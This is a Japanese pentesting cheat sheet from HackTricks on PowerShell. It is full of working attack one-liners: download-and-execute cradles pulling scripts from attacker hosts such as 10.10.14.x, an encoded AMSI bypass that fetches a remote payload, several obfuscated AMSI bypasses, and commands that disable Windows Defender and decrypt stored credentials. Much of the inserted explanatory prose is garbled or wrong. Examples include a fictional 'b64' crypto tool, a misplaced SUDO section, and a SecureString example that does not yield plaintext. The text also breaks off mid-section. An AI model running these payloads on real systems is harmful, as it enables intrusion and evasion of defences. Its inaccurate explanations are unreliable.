# ペンテスターのための基本的なPowerShell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## デフォルトのPowerShellの場所
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## 基本的なPSコマンドの開始

PowerShell (PS)は、Windowsシステムで使用される強力なスクリプト言語およびコマンドラインシェルです。Pentesterとして、PSを使用して効果的なハッキングテストを実行するために、いくつかの基本的なコマンドを知っておくことが重要です。

以下に、Pentesterが始めるための基本的なPSコマンドをいくつか紹介します。

### ファイルとディレクトリの操作

- **`Get-ChildItem`**: ファイルやディレクトリの一覧を表示します。
- **`Set-Location`**: カレントディレクトリを変更します。
- **`Copy-Item`**: ファイルやディレクトリをコピーします。
- **`Move-Item`**: ファイルやディレクトリを移動します。
- **`Remove-Item`**: ファイルやディレクトリを削除します。

### プロセスの管理

- **`Get-Process`**: 実行中のプロセスの一覧を表示します。
- **`Stop-Process`**: プロセスを停止します。

### レジストリの操作

- **`Get-Item`**: レジストリキーの値を表示します。
- **`Set-Item`**: レジストリキーの値を設定します。
- **`New-Item`**: 新しいレジストリキーを作成します。
- **`Remove-Item`**: レジストリキーを削除します。

### サービスの管理

- **`Get-Service`**: インストールされているサービスの一覧を表示します。
- **`Start-Service`**: サービスを開始します。
- **`Stop-Service`**: サービスを停止します。

これらの基本的なコマンドを使いこなすことで、PentesterはWindowsシステムでのハッキングテストを効果的に実行することができます。
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## ダウンロードと実行

To download and execute a file using PowerShell, you can use the following command:

PowerShellを使用してファイルをダウンロードして実行するには、次のコマンドを使用します。

```powershell
Invoke-WebRequest -Uri <URL> -OutFile <OutputFile>; .\<OutputFile>
```

Replace `<URL>` with the URL of the file you want to download, and `<OutputFile>` with the desired name for the downloaded file.

`<URL>`にはダウンロードしたいファイルのURLを、`<OutputFile>`にはダウンロードしたファイルの名前を指定します。

For example, to download a file named `payload.exe` from `http://example.com/payload.exe` and execute it, you would use the following command:

例えば、`http://example.com/payload.exe`から`payload.exe`という名前のファイルをダウンロードして実行する場合、次のコマンドを使用します。

```powershell
Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile payload.exe; .\payload.exe
```

Make sure to exercise caution when downloading and executing files from untrusted sources, as they may contain malicious content.

信頼できないソースからファイルをダウンロードして実行する際は、注意を払ってください。悪意のあるコンテンツが含まれている可能性があります。
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### AMSIバイパスを使用してバックグラウンドでダウンロード＆実行

This technique allows you to download and execute a file in the background while bypassing AMSI (Antimalware Scan Interface).

#### Usage:

```powershell
Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "$env:TEMP\file.exe"
Start-Process -FilePath "$env:TEMP\file.exe" -WindowStyle Hidden
```

#### Explanation:

1. The `Invoke-WebRequest` cmdlet is used to download the file from the specified URL (`http://example.com/file.exe`) and save it to the temporary folder (`$env:TEMP\file.exe`).

2. The `Start-Process` cmdlet is used to execute the downloaded file (`$env:TEMP\file.exe`) in the background with a hidden window style.

By using this technique, you can download and execute a file without triggering any antivirus or antimalware scans that may be performed by AMSI.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### Linuxでb64を使用する

The `b64` command in Linux is used to encode or decode data in Base64 format. It is a useful tool for manipulating and transferring data in a secure manner. The `b64` command can be used in various scenarios, such as encoding binary files, decoding Base64-encoded data, or performing cryptographic operations.

To encode data using `b64`, you can use the following command:

```bash
b64 -e <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file you want to encode, and `<output_file>` with the desired name for the encoded file. This command will take the contents of the input file, encode them in Base64 format, and save the result in the output file.

To decode Base64-encoded data using `b64`, you can use the following command:

```bash
b64 -d <input_file> > <output_file>
```

Replace `<input_file>` with the path to the file containing the Base64-encoded data, and `<output_file>` with the desired name for the decoded file. This command will take the Base64-encoded data from the input file, decode it, and save the result in the output file.

The `b64` command is a powerful tool for working with Base64-encoded data in Linux. It can be used in various scenarios, such as encoding or decoding files, performing cryptographic operations, or transferring data securely.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## ダウンロード

### System.Net.WebClient
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

`Invoke-WebRequest`は、PowerShellのコマンドレットで、WebサーバーにHTTPリクエストを送信するために使用されます。このコマンドレットは、ウェブページのコンテンツを取得したり、フォームを送信したり、Webサーバーとの対話を行ったりするために使用されます。

以下は、`Invoke-WebRequest`コマンドレットの使用例です。

```powershell
# ウェブページのコンテンツを取得する
$response = Invoke-WebRequest -Uri "https://example.com"

# レスポンスのステータスコードを表示する
$response.StatusCode

# レスポンスのヘッダーを表示する
$response.Headers

# レスポンスのボディを表示する
$response.Content

# フォームを送信する
$formData = @{
    "username" = "admin"
    "password" = "password123"
}
$response = Invoke-WebRequest -Uri "https://example.com/login" -Method POST -Body $formData

# レスポンスのコンテンツを表示する
$response.Content
```

`Invoke-WebRequest`コマンドレットは、ペンテストやセキュリティ調査の際に非常に便利です。ウェブアプリケーションの脆弱性をテストしたり、セキュリティ診断を行ったりするために使用することができます。
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to download files from the internet. It supports downloading files using various protocols such as HTTP, HTTPS, and FTP. Wget is commonly used in penetration testing to retrieve files from target systems.

To use Wget, you need to open a command prompt or terminal and enter the following command:

```
wget [URL]
```

Replace `[URL]` with the actual URL of the file you want to download. Wget will then retrieve the file and save it to your current directory.

You can also specify additional options with the `wget` command. For example, you can use the `-O` option to specify a different name for the downloaded file:

```
wget -O [filename] [URL]
```

Replace `[filename]` with the desired name for the downloaded file.

Wget is a powerful tool for downloading files during a penetration test. It can be used to retrieve sensitive information, such as configuration files or databases, from target systems. However, it is important to use Wget responsibly and within the boundaries of legal and ethical hacking.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransferは、PowerShellのモジュールであり、ファイルのダウンロードやアップロードを簡単に行うための便利なツールです。BitsTransferを使用すると、ネットワーク経由でファイルを転送することができます。

BitsTransferを使用するには、まず`Import-Module BitsTransfer`コマンドを使用してモジュールをインポートします。次に、`Start-BitsTransfer`コマンドを使用してファイルの転送を開始します。

以下は、BitsTransferを使用してファイルをダウンロードする例です。

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://example.com/file.txt" -Destination "C:\Downloads\file.txt"
```

上記の例では、`http://example.com/file.txt`から`C:\Downloads\file.txt`にファイルをダウンロードしています。

BitsTransferは、ファイルのダウンロードやアップロードに便利なオプションを提供します。たとえば、`-Priority`オプションを使用して転送の優先度を設定したり、`-ProxyUsage`オプションを使用してプロキシを経由して転送したりすることができます。

BitsTransferは、ペンテストやセキュリティ調査の際に便利なツールです。ファイルのダウンロードやアップロードを自動化するために、スクリプトやツールと組み合わせて使用することができます。
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

### Base64 Kali

Kali Linux is a popular penetration testing distribution that comes with a wide range of tools for various hacking techniques. One of the techniques commonly used in Kali Linux is encoding commands in Base64.

Base64 is a binary-to-text encoding scheme that allows binary data to be represented in an ASCII string format. This encoding is often used to transmit binary data over text-based protocols, such as email or HTTP.

In Kali Linux, you can use the `base64` command-line tool to encode and decode data in Base64. To encode a command in Base64, you can use the following syntax:

```bash
echo -n "command" | base64
```

For example, to encode the command `ls -la`, you would run:

```bash
echo -n "ls -la" | base64
```

The output will be the Base64-encoded representation of the command.

### EncodedCommand

EncodedCommand is a parameter used in PowerShell to specify a Base64-encoded command. This parameter allows you to run encoded PowerShell commands without the need to write them in plain text.

To use the EncodedCommand parameter, you need to encode your PowerShell command in Base64. You can do this using the `[System.Convert]::ToBase64String()` method in PowerShell.

Here's an example of how to encode a PowerShell command in Base64:

```powershell
$command = "Write-Host 'Hello, World!'"
$encodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
```

The variable `$encodedCommand` will now contain the Base64-encoded representation of the PowerShell command.

To run the encoded command using the EncodedCommand parameter, you can use the following syntax:

```powershell
powershell.exe -EncodedCommand <Base64-encoded command>
```

For example, to run the encoded command `Write-Host 'Hello, World!'`, you would run:

```powershell
powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACwAIABXAG8AcgBsAGQAIABXAG8AcgBsAGwAIQA=
```

This allows you to run PowerShell commands without exposing them in plain text, making it useful for various security and hacking scenarios.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [実行ポリシー](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [制約言語](broken-reference/)

## [AppLockerポリシー](broken-reference/)

## WinRMの有効化 (リモートPS)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Defenderの無効化

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSIバイパス

**`amsi.dll`**は、あなたのプロセスに**ロードされ**、アプリケーションが相互作用するために必要な**エクスポート**を持っています。そして、それはプロセスのメモリ空間にロードされているため、メモリ内の命令を**上書きすることで動作を変更**することができます。これにより、何も検出されないようにすることができます。

したがって、AMSIバイパスの目標は、**そのDLLの命令をメモリ内で上書きして検出を無効にする**ことです。

**AMSIバイパスジェネレーター**のウェブページ: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSIバイパス2 - マネージドAPI呼び出しフック

詳細な情報については、[**この投稿を参照してください**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)。\*\*\*\*[ **およびコード**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)。

この新しい技術は、.NETメソッドのAPI呼び出しフックに依存しています。実際には、.NETメソッドはメモリ内でネイティブなマシン命令にコンパイルされる必要があり、ネイティブなメソッドと非常に似た形になります。これらのコンパイルされたメソッドは、プログラムの制御フローを変更するためにフックすることができます。

.NETメソッドのAPI呼び出しフックを実行する手順は次のとおりです：

1. フックする対象メソッドを特定する
2. ターゲットと同じ関数プロトタイプを持つメソッドを定義する
3. メソッドを見つけるためにリフレクションを使用する
4. 各メソッドがコンパイルされていることを確認する
5. 各メソッドのメモリ上の位置を見つける
6. 悪意のあるメソッドを指す命令に対象メソッドを上書きする

## PS-History
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## 権限の取得

To gather information about the permissions assigned to a user or a group in a Windows system, you can use the `Get-Acl` cmdlet in PowerShell. This cmdlet retrieves the access control list (ACL) for a specified resource, such as a file or a directory.

```powershell
Get-Acl -Path C:\path\to\file.txt
```

This command will display the permissions assigned to the file.txt file, including the user or group name, the type of permission (e.g., Read, Write, Execute), and whether the permission is inherited from a parent object.

You can also use the `Get-Acl` cmdlet to retrieve the permissions for a registry key or a directory:

```powershell
Get-Acl -Path HKLM:\SOFTWARE\Microsoft
Get-Acl -Path C:\path\to\directory
```

By examining the permissions assigned to various resources, you can identify potential security vulnerabilities and determine if any unauthorized access has been granted.
```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```
## OSのバージョンとHotFixes

このスクリプトは、PowerShellを使用してWindowsオペレーティングシステムのバージョンと適用されたHotFixes（修正プログラム）を取得するためのものです。

### 使用法

1. スクリプトを実行する前に、PowerShellを管理者として実行してください。

2. スクリプトを実行すると、Windowsオペレーティングシステムのバージョンと適用されたHotFixesが表示されます。

### スクリプト

```powershell
# OSバージョンを取得
$osVersion = Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption

# HotFixesを取得
$hotFixes = Get-HotFix | Select-Object -Property HotFixID, InstalledOn

# 結果を表示
Write-Host "OSバージョン: $osVersion"
Write-Host "HotFixes:"
$hotFixes | Format-Table -AutoSize
```

### 出力例

```
OSバージョン: Microsoft Windows 10 Pro
HotFixes:

HotFixID   InstalledOn
--------   -----------
KB123456   2020/01/01
KB789012   2020/02/15
```

このスクリプトを使用することで、Windowsオペレーティングシステムのバージョンと適用されたHotFixesを簡単に取得できます。
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
## 環境

The following instructions assume that you have a Windows machine with PowerShell installed. If you don't have PowerShell installed, you can download it from the official Microsoft website.

以下の手順は、PowerShellがインストールされたWindowsマシンを想定しています。PowerShellがインストールされていない場合は、公式のMicrosoftのウェブサイトからダウンロードすることができます。

## Basic PowerShell Commands

PowerShell is a powerful scripting language and command-line shell that is built on the .NET Framework. It provides a wide range of commands and features that can be used for various purposes, including system administration, automation, and penetration testing.

Here are some basic PowerShell commands that can be useful for pentesters:

### Get-Process

The `Get-Process` command is used to retrieve information about the processes running on a system. It can be used to identify running processes, their process IDs (PIDs), memory usage, and other details.

```powershell
Get-Process
```

### Get-Service

The `Get-Service` command is used to retrieve information about the services running on a system. It can be used to identify running services, their status, and other details.

```powershell
Get-Service
```

### Get-NetAdapter

The `Get-NetAdapter` command is used to retrieve information about the network adapters installed on a system. It can be used to identify network interfaces, their IP addresses, MAC addresses, and other details.

```powershell
Get-NetAdapter
```

### Get-NetFirewallRule

The `Get-NetFirewallRule` command is used to retrieve information about the firewall rules configured on a system. It can be used to identify firewall rules, their status, and other details.

```powershell
Get-NetFirewallRule
```

### Get-EventLog

The `Get-EventLog` command is used to retrieve information from the event logs on a system. It can be used to identify logged events, their timestamps, event IDs, and other details.

```powershell
Get-EventLog -LogName System
```

These are just a few examples of the basic PowerShell commands that can be used for pentesting. PowerShell provides many more commands and features that can be explored and utilized for various purposes.
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## 他の接続されたドライブ

When conducting a penetration test on a Windows system, it is important to gather as much information as possible about the target. One area that is often overlooked is the presence of other connected drives.

In Windows, a connected drive refers to any additional storage device that is connected to the system, such as USB drives, external hard drives, or network drives. These drives may contain valuable information that can be useful during a penetration test.

To identify other connected drives, we can use PowerShell. PowerShell is a powerful scripting language that is built into Windows and provides a wide range of functionalities for system administration and automation.

To list all the connected drives on a Windows system, we can use the following PowerShell command:

```powershell
Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, VolumeName, FileSystem, Size, FreeSpace
```

This command uses the `Get-WmiObject` cmdlet to retrieve information about logical disks on the system. The `Select-Object` cmdlet is then used to select specific properties, such as the device ID, volume name, file system, size, and free space.

By running this command, we can obtain a list of all the connected drives along with their respective properties. This information can be helpful in identifying potential targets for further investigation or exploitation.

It is worth noting that some connected drives may require elevated privileges to access. In such cases, it may be necessary to escalate privileges or obtain the necessary credentials to access the drive.

In conclusion, when conducting a penetration test on a Windows system, it is important to gather information about other connected drives. PowerShell provides a convenient way to retrieve this information and can be a valuable tool in the penetration tester's arsenal.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### リサイクル ビン

The Recycle Bin is a feature in Windows that allows users to temporarily store deleted files and folders. When a file or folder is deleted, it is moved to the Recycle Bin instead of being permanently deleted from the system. This provides a safety net for users in case they accidentally delete something and need to restore it.

To access the Recycle Bin, simply double-click on its icon on the desktop. This will open a window displaying all the files and folders that have been deleted. From here, you can select the items you want to restore and click on the "Restore" button to move them back to their original location.

It's important to note that the Recycle Bin has a limited storage capacity. Once it reaches its maximum size, older items will be automatically deleted to make room for new ones. You can adjust the size of the Recycle Bin by right-clicking on its icon, selecting "Properties," and then adjusting the slider under the "Maximum size" section.

In addition to restoring deleted files, the Recycle Bin also allows you to permanently delete items. To do this, simply select the files or folders you want to delete and click on the "Delete" button. This will bypass the Recycle Bin and permanently remove the selected items from the system.

Overall, the Recycle Bin is a useful feature in Windows that helps protect against accidental file deletions. It provides a convenient way to restore deleted items and also allows for permanent deletion when needed.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## ドメインの偵察

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## ユーザー
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## セキュアな文字列から平文へ

In some cases, during a penetration test, you may come across a secure string that needs to be converted to plaintext for further analysis. PowerShell provides a way to convert secure strings to plaintext using the `ConvertFrom-SecureString` cmdlet.

以下の場合、ペネトレーションテスト中に、さらなる分析のためにセキュアな文字列を平文に変換する必要があることがあります。PowerShellは、`ConvertFrom-SecureString`コマンドレットを使用して、セキュアな文字列を平文に変換する方法を提供しています。

To convert a secure string to plaintext, follow these steps:

セキュアな文字列を平文に変換するには、以下の手順に従ってください。

1. Open a PowerShell session.

1. PowerShellセッションを開きます。

2. Use the `ConvertFrom-SecureString` cmdlet followed by the secure string you want to convert. For example:

2. 変換したいセキュアな文字列の後に`ConvertFrom-SecureString`コマンドレットを使用します。例えば：

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plainText = ConvertFrom-SecureString -SecureString $secureString
```

3. The secure string will be converted to plaintext and stored in the `$plainText` variable.

3. セキュアな文字列は平文に変換され、`$plainText`変数に格納されます。

Keep in mind that converting a secure string to plaintext should only be done for legitimate purposes and with proper authorization.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
または、XMLから直接解析する場合:
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

SUDOは、Linuxシステムで特権ユーザーとしてコマンドを実行するためのツールです。通常、rootユーザーの権限を持たないユーザーが、一時的にroot権限を取得して必要な操作を行うために使用されます。

SUDOを使用すると、ユーザーは自分のパスワードを入力して特権コマンドを実行することができます。これにより、ユーザーは必要な操作を行うためにroot権限を取得することができますが、常にroot権限を持つわけではありません。

SUDOの設定は、`/etc/sudoers`ファイルで行われます。このファイルには、どのユーザーがどのコマンドを実行できるかの設定が含まれています。また、`visudo`コマンドを使用して、`/etc/sudoers`ファイルを編集することが推奨されています。

SUDOの設定にはいくつかのオプションがあります。例えば、ユーザーがパスワードを入力せずにSUDOを使用することも可能です。また、特定のコマンドのみを実行できるように制限することもできます。

SUDOを使用する際には、セキュリティ上の注意が必要です。不適切な設定や悪意のあるユーザーによる悪用が行われると、システムのセキュリティが脅かされる可能性があります。そのため、SUDOの設定は慎重に行う必要があります。

SUDOは、Linuxシステムでの特権ユーザーの操作を制御するための強力なツールです。正しく設定されたSUDOは、システムのセキュリティを向上させることができます。
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
